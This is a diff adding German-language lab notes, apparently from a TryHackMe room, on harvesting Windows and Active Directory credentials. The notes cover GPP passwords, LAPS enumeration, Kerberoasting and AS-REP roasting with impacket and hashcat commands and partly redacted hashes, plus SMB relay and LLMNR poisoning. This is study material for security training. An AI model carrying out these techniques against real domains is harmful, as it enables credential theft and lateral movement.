@@ -527,3 +527,215 @@ Um nur den System Boot Key Value zu bekommen müssen wir folgendes ausführen:
 >impacket-secretsdump -system System
 
 # Local Administrator Password Solution (LAPS)
+
+Jetzt schauen wir uns an, wie wir lokale Admin Passwörter ergattern können, wenn im AD das LAPS Feature aktiviert ist.
+
+### Group Policy Preferences (GPP)
+
+Eine Windows Installation hat einen built-in Admin Account der mit einem Paswort zugänglich ist. Passwörter in einem riesigen Windows Netzwerk zu ändern kann schon etwas herausfordernd sein.
+Dafür hat Microsoft eine Methode eingeführt mit der man Lokale Admin Passwörter von Workstations einfach über Group Policy Preferences ändern kann.
+
+GPP ist ein Tool das Administratoren erlaubt Domain Policies mit eingebetteten Credentials zu erstellen. Wenn GPP ausgeführt wurde, wurden verchiedene XML Dateien im SYSVOL Ordner erstellt. SYSVOL ist ein zentrales Element im AD und wird von allen Domain Users mit Leserechten genutzt. 
+
+Das Problem war, dass die GPP relevanten XML Dateien ein Password mit einer AES256 Verschlüsselung beinhalteten. Zu dieser Zeit war das auch noch in Ordnung und nicht knackbar. Jedoch veröffentliche Microsoft irgendie die Privaten Schlüssel und da die User den Inhalt von SYSVOL lesen konnten, war es relativ einfach, dass Passwort zu entschlüsseln. Ein Tool zum cracken des Passworts ist [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
+
+### Local Administrator Password Solution (LAPS)
+
+Im Jahr 2015 entfernte Microsoft das Speichern des Passworts im SYSVOL Ordner und stelle Local Administrator Password Solutions (LAPS) vor. Damit wurde ein Versuch unternommen, das verwalten der Loakl Admin Passwörter sicherer zu machen.
+
+Die neue Methode beinhaltet zwei neue Attribute (ms-msc-AdmPwd und ms-msc-AdmPwdExpirationTime) in einem Objekt im Active Directory. Das ***mc-mcs-AdmPwd*** Attribut enthält ein clear-text Passwort des lokalen Admins, während das ***mc-mcs-AdmPwdExpirationTime*** Attribut das Ablaufdatum zum Resetten des Passworts enthält. LAPS nutzt ***admpwd.dll*** um das lokale Admin Password zu ändern und den Wert von ***mc-mcs-AdmPwd*** zu aktualisieren. 
+
+![alt text](images/image3.png)
+
+
+### Enumerate for LAPS
+
+Wir schauen uns erstmal an, ob LAPS auf dem System installiert ist, indem wir die ***admpwd.dll*** Datei suchen:
+
+```bash
+C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Program Files\LAPS\CSE
+
+06/06/2022  01:01 PM              .
+06/06/2022  01:01 PM              ..
+05/05/2021  07:04 AM           184,232 AdmPwd.dll
+               1 File(s)        184,232 bytes
+               2 Dir(s)  10,306,015,232 bytes free
+```
+
+LAPS scheint auf der Maschine zu sein. Sind cmdlets für ***AdmPwd*** verfügbar?
+
+```bash
+PS C:\Users\thm> Get-Command *AdmPwd*
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
+Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
+Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
+```
+
+Als nächstes müssen wir die AD OU finden, die das "All extended Rights" Attribut hat, das mit LAPS interagiert. Wir nutzen das "Find-AdmPwdExtendedRights" cmdlet um die richtige OU anzuzeigen.
+
+```bash
+PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg
+
+ObjectDN                                      ExtendedRightHolders
+--------                                      --------------------
+OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}
+```
+
+Wir sehen im Output das die LAPsReader Gruppe in THMorg zugang zu LAPS hat. Schauen wir uns die Member dieser Gruppe an:
+
+```bash
+PS C:\Users\thm> net groups "LAPsReader"
+Group name     LAPsReader
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+bk-admin
+The command completed successfully.
+
+PS C:\Users\victim> net user bk-admin
+User name                    bk-admin
+Full Name                    THM Admin Test Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+[** Removed **]
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+                             *LAPsReader           *Enterprise Admins
+The command completed successfully.
+```
+
+### Getting the Password
+
+Wir sehen, dass BK-Admin ein Mitglied der LapsReader Gruppe ist, also müssen wir diesen User kompromettieren oder nachahmen. Nachdem wir das getan haben, können wir mit dem ***Get-AdmPwdPassword*** cmdlet das LAPS Passwort bekommen.
+
+```bash
+PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
+
+ComputerName         DistinguishedName                             Password           ExpirationTimestamp
+------------         -----------------                             --------           -------------------
+CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
+```
+
+Es wichtig zu beachten, dass in einem realen Active Directory LAPS nur auf bestimmten Computern verfügbar ist. Das bedeutet man muss den richtigen Computer sowie den richtigen Account finden. Es gibt dafür auch Scripts wie bspw. [LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)
+
+# Other Attacks
+
+Bisher sind wir immer davon ausgegangen, dass wir bereits einen Zugang zum Netzwerk haben und Credentials aus dem Speicher oder aus Dateien im Windows System ziehen. 
+
+### Kerberoasting
+
+Kerberoasting ist eine beliebte AD Attacke um an Tickets zu kommen und Persistence zu erreichen. Für eine erfolgreiche Attacke muss der Angreifer Zugang zu SPN Accounts haben wie bspw. IIS, MSSQL etc. 
+Kerberoasting beinhaltet  das Anfragen eines TGT und TGS um eine Privilege Escalation und Lateral Movement zu erreichen. 
+
+Wir demonstrieren diese Attacke. Wir suchen erstmal nach SPN Account an die wir eine Anfrage für ein TGS senden können. 
+
+```bash
+user@mimpacket-GetUserSPNs -dc-ip 10.10.97.98 THM.red/thm
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+```
+
+Wir sehen den SPN Account ***svc-user*** an den wir unseren TGS Request senden können. 
+Wir schicken also ein TGS Ticket request für den srv-user mit dem ***-request-user*** Argument:
+
+```bash
+user@machine$ impacket-GetUserSPNs -dc-ip 10.10.97.98 THM.red/thm -request-user svc-user 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
+```
+
+Diesen Hash cracken wir jetzt mit Hashcat:
+
+```bash
+user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+```
+
+### AS-REP Roasting
+
+Das ist eine Technik die es einem Angreifer erlaubt, Password Hashes zu für AD User Accounts zu erhalten, bei denen die Option "Do not require Kerberos pre-authentication" ausgewählt ist. Diese Option bezieht sich auf das alte Kerberos Authentication Protokoll, die es eine authentifizierung ohne Passwort erlaubt. Wenn wir die Hashes haben, können wir sie eventuell cracken und das Passwort erhalten.
+
+![alt text](images/image4.png)
+
+Lass uns diese begehrten Accounts finden, die keine Pre-Auth brauchen. Impacket hat da das passende Tool für uns:
+
+```bash
+root@machine$ impacket-GetNPUsers -dc-ip 10.10.97.98 thm.red/ -usersfile /tmp/users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
+[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Sobald das Tool die entsprechenden Accounts gefunden hat gibt es die Hashes für die Tickets aus.
+
+Entweder wieder cracken oder vlt. sowas wie Pass-the-Hash?
+
+### SMB Relay Attack
+
+Diese Attacke nutzt den NTLM Authentication Mechanismus bzw. das NTLM Challenge-response-Protokoll aus. Der Angreifer performt eine Man-in-the-Middle Attacke und captured SMB Pakete und extrahiert die Hashes. Für diese Attacke muss das SMB Signing deaktiviert sein. SMB Signing ist ein Sicherheitscheck und stellt sicher, dass der Verbindung vertraut wird. 
+Für weitere Infos bitte in Exploiting AD schauen.
+
+### LLMNR/NBNS Poisoning
+
+Link-Local Multicast Name Resolution LLMNR und NetBIOS Name Service NBT-NS helfen lokalen Maschinen im Netzwerk den richtigen Rechner zu finden wenn DNS fehlschlägt. Zum Beispiel wenn eine Maschine im Netzwerk versucht einen Host zu erreichen für den es keinen DNS Record (DNS failed to resolve) gibt. In diesem Fall sendet die Maschine eine Multicast Message an alle Hosts im Netzwerk und fragt nach der richtigen Adresse über LLMNR oder NBT-NS.
+
+Das LLMNR/NBNS Poisoning tritt auf, wenn ein Angreifer sich als legitime Quelle im Netzwerk ausgibt und auf den Multicast Rundruf bzw. auf den LLMNR/NBNS Verkehr antwortet, und somit eine Authentifizierung provoziert. 
+
+Das Ziel dahinter ist, diese Authentifizierung abzufangen und den NTLM Hash zu dumpen.
+
+
+# Conclusion
+
+Recap
+
+In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:
+
+We discussed accessing Windows memory, dumping an LSASS process, and extracting authentication hashes.
+We discussed Windows Credentials Manager and methods to extract passwords. 
+We introduced the Windows LAPS feature and enumerated it to find the correct user and target to extract passwords.
+We introduced AD attacks which led to dumping and extracting users' credentials.
+The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.
+
+[Snaffler](https://github.com/SnaffCon/Snaffler)
+
+[Seatbelt](https://github.com/GhostPack/Seatbelt)
+
+[Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)
+
+
+
+
